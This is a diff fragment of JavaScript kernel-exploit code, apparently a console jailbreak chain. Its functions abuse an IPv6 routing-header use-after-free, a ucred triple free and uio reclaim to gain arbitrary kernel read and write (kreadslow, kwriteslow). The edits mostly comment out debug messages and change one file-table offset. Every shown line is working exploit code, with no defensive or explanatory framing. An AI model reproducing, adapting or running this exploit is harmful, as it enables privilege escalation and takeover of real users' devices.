@@ -897,7 +897,7 @@ function find_triplet(master, other, iterations) {
         val = read32(leak_add);
         j = val & 0xFFFF;
         if ((val & 0xFFFF0000) === RTHDR_TAG && j !== master && j !== other) {
-            debug("Triplet found: [" + j + "] at iteration " + count);
+            //debug("Triplet found: [" + j + "] at iteration " + count);
             return j;
         }
         //}
@@ -940,7 +940,7 @@ function netctrl_exploit() {
 
     // Leak fd_files from kq_fdp.
     const fd_files = kreadslow64(kq_fdp);
-    fdt_ofiles = fd_files.add(0x08);
+    fdt_ofiles = fd_files.add(0x00);
     debug("fdt_ofiles: " + hex(fdt_ofiles));
 
     masterRpipeFile = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
@@ -1135,7 +1135,7 @@ function trigger_ucred_triplefree() {
         // Note: Only dup works because it does not check f_hold.
         close(dup(uaf_socket));
 
-        debug("Finding Twins...");
+        //debug("Finding Twins...");
         // Find twins.
         end = find_twins();
 
@@ -1374,7 +1374,7 @@ function kreadslow(addr, size) {
     }
 
     var uio_iov = read64(leak_rthdr);
-    debug("This is uio_iov: " + hex(uio_iov));
+    //debug("This is uio_iov: " + hex(uio_iov));
 
     // Prepare uio reclaim buffer.
     build_uio(msgIov, uio_iov, 0, true, addr, size);
@@ -1486,7 +1486,7 @@ function kwriteslow(addr, buffer, size) {
         get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);
 
         if (read32(uio_leak_add) === UIO_IOV_NUM) {
-            debug("Break on reclaim with uio");
+            //debug("Break on reclaim with uio");
             break;
         }
 
@@ -1499,7 +1499,7 @@ function kwriteslow(addr, buffer, size) {
     }
 
     var uio_iov = read64(leak_rthdr);
-    debug("This is uio_iov: " + hex(uio_iov));
+    //debug("This is uio_iov: " + hex(uio_iov));
 
     // Prepare uio reclaim buffer.
     build_uio(msgIov, uio_iov, 0, false, addr, size);
@@ -1523,7 +1523,7 @@ function kwriteslow(addr, buffer, size) {
         get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);
 
         if (read32(iov_leak_add) === UIO_SYSSPACE) {
-            debug("Break on reclaim uio with iov");
+            //debug("Break on reclaim uio with iov");
             break;
         }
 
